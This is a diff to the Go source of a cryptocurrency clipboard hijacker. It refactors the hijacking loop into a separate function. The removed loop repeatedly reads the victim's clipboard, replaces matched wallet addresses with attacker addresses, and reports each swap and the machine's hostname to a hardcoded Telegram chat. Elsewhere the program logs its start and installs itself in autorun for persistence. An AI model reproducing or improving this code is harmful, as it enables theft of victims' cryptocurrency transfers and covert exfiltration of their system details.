@@ -4,9 +4,6 @@ import (
 	"fmt"
 	"os"
 	"regexp"
-	"time"
-
-	"github.com/atotto/clipboard"
 )
 
 var (
@@ -41,8 +38,9 @@ var (
 	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
 )
 
+
 func main() {
-	hostname, _ := os.Hostname() // pc hostname (like DESKTOP-TEST123)
+	hostname, _ := os.Hostname()
 
 	// send start log to telegram
 	SendLog(fmt.Sprintf(
@@ -55,50 +53,7 @@ func main() {
 	_ = AddToAutorun(selfDir, "sys")
 
 	// we starting main clipper process
-	var lastClipboardContent string
+	StartClipper()
 
-	for {
-		time.Sleep(900 * time.Millisecond)
-
-		currentContent, err := clipboard.ReadAll()
-		if err != nil {
-			continue
-		}
-
-		if currentContent == lastClipboardContent {
-			continue
-		}
-
-		matched := false
-		for _, matcher := range matchers {
-			if matcher.regex.MatchString(currentContent) {
-				originalAddr := currentContent
-
-				err = clipboard.WriteAll(matcher.addr)
-				if err != nil {
-					continue
-				}
-
-				SendLog(
-					fmt.Sprintf(
-						"%s\n\n%s → %s",
-						hostname,
-						originalAddr,
-						matcher.addr,
-					),
-					chat_id,
-					bot_token,
-				)
-
-				lastClipboardContent = originalAddr
-				matched = true
-
-				break
-			}
-		}
-
-		if !matched {
-			lastClipboardContent = currentContent
-		}
-	}
+	select {}
 }
